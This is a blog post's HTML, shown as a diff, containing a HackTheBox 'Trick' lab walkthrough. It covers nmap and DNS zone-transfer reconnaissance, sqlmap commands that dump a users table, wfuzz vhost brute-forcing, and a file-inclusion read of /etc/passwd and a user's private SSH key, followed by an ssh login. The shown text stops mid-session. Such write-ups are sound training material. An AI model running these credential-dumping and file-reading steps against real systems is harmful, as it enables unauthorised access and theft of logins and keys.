@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Trick - Saad Akhtar</title><meta name="Description" content="HackTheBox easy linux machine Trick walkthrough."><meta property="og:title" content="HackTheBox - Trick" />
+<meta property="og:description" content="HackTheBox easy linux machine Trick walkthrough." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-trick/" /><meta property="og:image" content="/hackthebox-trick/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-29T11:00:21+05:00" />
+<meta property="article:modified_time" content="2022-10-29T11:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-trick/0.png"/>
+<meta name="twitter:title" content="HackTheBox - Trick"/>
+<meta name="twitter:description" content="HackTheBox easy linux machine Trick walkthrough."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-trick/" /><link rel="prev" href="/hackthebox-opensource/" /><link rel="next" href="/hackthebox-shared/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Trick",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-trick\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-trick\/0.png",
+                            "width":  1400 ,
+                            "height":  1060 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  1441 ,
+        "url": "\/hackthebox-trick\/","datePublished": "2022-10-29T11:00:21+05:00","dateModified": "2022-10-29T11:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "HackTheBox easy linux machine Trick walkthrough."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Trick</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-29">2022-10-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1441 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-trick/0.png"
+        data-srcset="/hackthebox-trick/0.png, /hackthebox-trick/0.png 1.5x, /hackthebox-trick/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-trick/0.png"
+        title="HackTheBox easy linux machine Trick walkthrough." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#usertxt">user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#roottxt">root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Easy Linux Machine Trick from HackTheBox.</p>
+<h2 id="summary">Summary</h2>
+<p>Trick from HackTheBox is an Easy Linux Machine. We get a subdomain by performing a DNS zone transfer which in turn reveals another subdomain by brute-forcing on the same pattern. The newly discovered website was vulnerable to LFI through which we can read the private <code>ssh</code> key of the user and login to get the <code>user.txt</code>. The current user being able to restart the <code>fail2ban</code> service as root and being part of <code>security</code> group leads to Privilege Escalation by abusing the <code>fail2ban</code> configuration.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv 10.10.11.166 -oN nmapN     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 61:ff:29:3b:36:bd:9d:ac:fb🇩🇪1f:56:88:4c:ae:2d <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 9e💿f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 72:93:f9:11:58🇩🇪34:ad:12:b5:4b:4a:73:64:b9:70 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
+</span></span><span class="line"><span class="cl">25/tcp open  smtp    syn-ack Postfix smtpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+</span></span><span class="line"><span class="cl">53/tcp open  domain  syn-ack ISC BIND 9.11.5-P4-5.1+deb10u7 <span class="o">(</span>Debian Linux<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack nginx 1.14.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Coming Soon - Start Bootstrap Theme
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
+</span></span><span class="line"><span class="cl">Service Info: Host:  debian.localdomain<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have multiple open ports. Enumerating port 80, we get a website.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/1.png" title="Website on port 80" data-thumbnail="/hackthebox-trick/1.png" data-sub-html="<h2>Website</h2><p>Website on port 80</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/1.png"
+            data-srcset="/hackthebox-trick/1.png, /hackthebox-trick/1.png 1.5x, /hackthebox-trick/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/1.png" width="1920" height="860" />
+    </a><figcaption class="image-caption">Website</figcaption>
+    </figure></p>
+<p>Since I couldn&rsquo;t find much here. I tried enumerating port <code>53</code> DNS.</p>
+<p>We can try a zone transfer to get some information.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dig axfr @10.10.11.166 trick.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb
+</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span>
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      NS      trick.htb.
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      A       127.0.0.1
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      AAAA    ::1
+</span></span><span class="line"><span class="cl">preprod-payroll.trick.htb. <span class="m">604800</span> IN    CNAME   trick.htb.
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">176</span> msec
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.11.166#53<span class="o">(</span>10.10.11.166<span class="o">)</span> <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Sat Oct <span class="m">29</span> 02:18:45 EDT <span class="m">2022</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> XFR size: <span class="m">6</span> records <span class="o">(</span>messages 1, bytes 231<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nice. We get a subdomain <code>preprod-payroll.trick.htb</code> here. Visiting the subdomain after adding it to our <code>/etc/hosts</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/2.png" title="preprod-production.trick.htb" data-thumbnail="/hackthebox-trick/2.png" data-sub-html="<h2>preprod-production.trick.htb</h2><p>preprod-production.trick.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/2.png"
+            data-srcset="/hackthebox-trick/2.png, /hackthebox-trick/2.png 1.5x, /hackthebox-trick/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/2.png" width="1920" height="864" />
+    </a><figcaption class="image-caption">preprod-production.trick.htb</figcaption>
+    </figure></p>
+<p>Default credentials didn&rsquo;t work here but trying for SQLi showed some errors.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/3.png" title="Login Request" data-thumbnail="/hackthebox-trick/3.png" data-sub-html="<h2>Login Request</h2><p>Login Request</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/3.png"
+            data-srcset="/hackthebox-trick/3.png, /hackthebox-trick/3.png 1.5x, /hackthebox-trick/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/3.png" width="1913" height="454" />
+    </a><figcaption class="image-caption">Login Request</figcaption>
+    </figure></p>
+<p>We can dig further to get the SQLi.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlmap -r login.req http://preprod-payroll.trick.htb/ --current-db
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using <code>sqlmap</code> we identified the Database is <code>payroll_db</code>.</p>
+<p>Next we can look for tables in this db.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlmap -r login.req http://preprod-payroll.trick.htb/ -D payroll_db --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-trick/16.png" title="Tables in payroll_db" data-thumbnail="/hackthebox-trick/16.png" data-sub-html="<h2>Tables in payroll_db</h2><p>Tables in payroll_db</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/16.png"
+            data-srcset="/hackthebox-trick/16.png, /hackthebox-trick/16.png 1.5x, /hackthebox-trick/16.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/16.png" width="1910" height="248" />
+    </a><figcaption class="image-caption">Tables in payroll_db</figcaption>
+    </figure></p>
+<p>Now for the entries in the <code>users</code> table.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlmap -r login.req http://preprod-payroll.trick.htb/ -D payroll_db -T users --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-trick/17.png" title="users table" data-thumbnail="/hackthebox-trick/17.png" data-sub-html="<h2>users table</h2><p>users table</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/17.png"
+            data-srcset="/hackthebox-trick/17.png, /hackthebox-trick/17.png 1.5x, /hackthebox-trick/17.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/17.png" width="1909" height="126" />
+    </a><figcaption class="image-caption">users table</figcaption>
+    </figure></p>
+<p>Logging with these credentials we get the following page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/18.png" title="Logged in" data-thumbnail="/hackthebox-trick/18.png" data-sub-html="<h2>Logged in</h2><p>Logged in</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/18.png"
+            data-srcset="/hackthebox-trick/18.png, /hackthebox-trick/18.png 1.5x, /hackthebox-trick/18.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/18.png" width="1920" height="870" />
+    </a><figcaption class="image-caption">Logged in</figcaption>
+    </figure></p>
+<p>I couldn&rsquo;t find anything further here so moved on to brute-forcing <code>vhosts</code>.</p>
+<p>Brute-forcing <code>vhosts</code> we couldn&rsquo;t find any so we can try brute-forcing with a pattern <code>preprod-&lt;subdomain&gt;.trick.htb</code></p>
+<p>We can first use <code>sed</code> command to add a prefix to our wordlist then use <code>wfuzz</code> to brute-force subdomains based on their character count.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sed -e <span class="s1">&#39;s/^/preprod-/&#39;</span> /home/kali/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  &gt; newWordlist
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ wfuzz -c -f sub-fighter -w newWordlist -u <span class="s1">&#39;http://trick.htb&#39;</span> -H <span class="s2">&#34;Host: FUZZ.trick.htb&#34;</span>  --hh <span class="m">5480</span>
+</span></span><span class="line"><span class="cl"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="err">&#39;</span>s documentation <span class="k">for</span> more information.
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://trick.htb/
+</span></span><span class="line"><span class="cl">Total requests: <span class="nv">114441</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>                                                                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000254:   <span class="m">200</span>        <span class="m">178</span> L    <span class="m">631</span> W      <span class="m">9660</span> Ch     <span class="s2">&#34;preprod-marketing&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Adding this subdomain to our <code>/etc/hosts</code> then visiting.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/4.png" title="preprod-marketing.trick.htb" data-thumbnail="/hackthebox-trick/4.png" data-sub-html="<h2>preprod-marketing.trick.htb</h2><p>preprod-marketing.trick.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/4.png"
+            data-srcset="/hackthebox-trick/4.png, /hackthebox-trick/4.png 1.5x, /hackthebox-trick/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/4.png" width="1920" height="865" />
+    </a><figcaption class="image-caption">preprod-marketing.trick.htb</figcaption>
+    </figure></p>
+<h2 id="foothold">Foothold</h2>
+<p>Looking around we have a <code>page</code> parameter which looks interesting for a <code>LFI</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/5.png" title="Page Parameter" data-thumbnail="/hackthebox-trick/5.png" data-sub-html="<h2>Page Parameter</h2><p>Page Parameter</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/5.png"
+            data-srcset="/hackthebox-trick/5.png, /hackthebox-trick/5.png 1.5x, /hackthebox-trick/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/5.png" width="1920" height="869" />
+    </a><figcaption class="image-caption">Page Parameter</figcaption>
+    </figure></p>
+<p>Bypassing some basic filtering we get the <code>LFI</code></p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/6.png" title="Reading /etc/passwd through LFI" data-thumbnail="/hackthebox-trick/6.png" data-sub-html="<h2>Reading /etc/passwd through LFI</h2><p>Reading /etc/passwd through LFI</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/6.png"
+            data-srcset="/hackthebox-trick/6.png, /hackthebox-trick/6.png 1.5x, /hackthebox-trick/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/6.png" width="1916" height="765" />
+    </a><figcaption class="image-caption">Reading /etc/passwd through LFI</figcaption>
+    </figure></p>
+<p>From the <code>/etc/passwd</code> we know there&rsquo;s a user <code>michael</code>, so we can check for <code>ssh</code> keys in it&rsquo;s home directory.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/7.png" title="Reading /home/michael/.ssh/id_rsa" data-thumbnail="/hackthebox-trick/7.png" data-sub-html="<h2>Reading /home/michael/.ssh/id_rsa</h2><p>Reading /home/michael/.ssh/id_rsa</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/7.png"
+            data-srcset="/hackthebox-trick/7.png, /hackthebox-trick/7.png 1.5x, /hackthebox-trick/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/7.png" width="1918" height="763" />
+    </a><figcaption class="image-caption">Reading /home/michael/.ssh/id_rsa</figcaption>
+    </figure></p>
+<p>Try logging in with the <code>id_rsa</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/Trick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh -i id_rsa michael@trick.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">michael@trick:~$ whoami
+</span></span><span class="line"><span class="cl">michael
+</span></span><span class="line"><span class="cl">
